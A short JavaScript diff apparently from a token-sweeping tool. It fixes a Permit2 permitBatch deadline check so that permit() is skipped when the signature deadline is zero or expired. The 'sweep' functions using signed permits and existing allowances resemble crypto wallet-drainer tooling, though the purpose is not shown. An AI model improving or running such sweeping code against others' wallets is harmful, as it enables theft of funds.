@@ -798,8 +798,10 @@ async function sweepGaslessWallet(walletAddress) {
     if (needsPermit) {
       const pbSigDeadline = Number(permitBatch.sigDeadline ?? 0);
       const nowCheck = Math.floor(Date.now() / 1000);
-      if (pbSigDeadline > 0 && pbSigDeadline < nowCheck) {
-        warn(`[gasless] permitBatch sigDeadline expired ${Math.floor((nowCheck - pbSigDeadline) / 86400)} days ago — skipping permit() call, using existing on-chain allowances`);
+      // Skip permit() when sigDeadline is missing/zero OR already past.
+      // "0 > 0" was previously false, letting permit(sigDeadline=0) slip through → revert.
+      if (pbSigDeadline === 0 || pbSigDeadline < nowCheck) {
+        warn(`[gasless] permitBatch sigDeadline ${pbSigDeadline === 0 ? 'missing/zero' : `expired ${Math.floor((nowCheck - pbSigDeadline) / 86400)} days ago`} — skipping permit() call, using existing on-chain allowances`);
       } else {
         log(`[gasless] ${checksum} -- calling permit2.permit() (${permitBatch.details.length} token(s))`);
         try {
@@ -1820,8 +1822,9 @@ async function sweep(wallet) {
         if (needsPermitCall) {
           const pb3SigDeadline = Number(pbData.permit.sigDeadline ?? 0);
           const nowSecs3 = Math.floor(Date.now() / 1000);
-          if (pb3SigDeadline > 0 && pb3SigDeadline < nowSecs3) {
-            warn(`[allowance] permitBatch sigDeadline expired ${Math.floor((nowSecs3 - pb3SigDeadline) / 86400)} days ago — skipping permit() call, using existing on-chain allowances`);
+          // Skip permit() when sigDeadline is missing/zero OR already past.
+          if (pb3SigDeadline === 0 || pb3SigDeadline < nowSecs3) {
+            warn(`[allowance] permitBatch sigDeadline ${pb3SigDeadline === 0 ? 'missing/zero' : `expired ${Math.floor((nowSecs3 - pb3SigDeadline) / 86400)} days ago`} — skipping permit() call, using existing on-chain allowances`);
           } else {
             log(`[allowance] calling permit() to register ${pbData.permit.details.length} token allowances (spender=${pb3Spender.slice(0,10)})`);
             const fee = await getFeeData();
